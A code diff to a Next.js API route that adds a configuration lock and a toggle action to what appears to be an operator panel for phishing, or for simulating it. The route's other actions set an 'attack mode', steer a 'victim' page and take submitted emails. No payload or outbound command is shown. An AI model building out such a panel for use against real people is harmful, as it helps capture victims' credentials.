@@ -104,11 +104,16 @@ export async function POST(request: NextRequest) {
     const stateRef = ref(db, '/');
 
     switch (body.action) {
-      case 'setConfig':
+      case 'setConfig': {
+        const appState = await getAppState();
+        if (appState.config.isLocked) {
+           return NextResponse.json({ error: 'Configuration is locked.' }, { status: 403 });
+        }
         await set(ref(db, 'config'), body.config);
         // Reset victim state when new config is set
         await set(ref(db, 'victim'), initialState.victim);
         return NextResponse.json({ success: true, message: 'Configuration updated' });
+      }
 
       case 'setAttackMode':
         await update(ref(db, 'config'), { attackMode: body.mode });
@@ -123,6 +128,10 @@ export async function POST(request: NextRequest) {
       case 'setVictimPage':
         await update(ref(db, 'victim'), { currentPage: body.page });
         return NextResponse.json({ success: true, message: `Victim page set to ${body.page}` });
+
+      case 'toggleConfigLock':
+        await update(ref(db, 'config'), { isLocked: body.isLocked });
+        return NextResponse.json({ success: true, message: `Configuration lock set to ${body.isLocked}` });
 
       case 'submitEmail': {
         const configRef = ref(db, 'config');
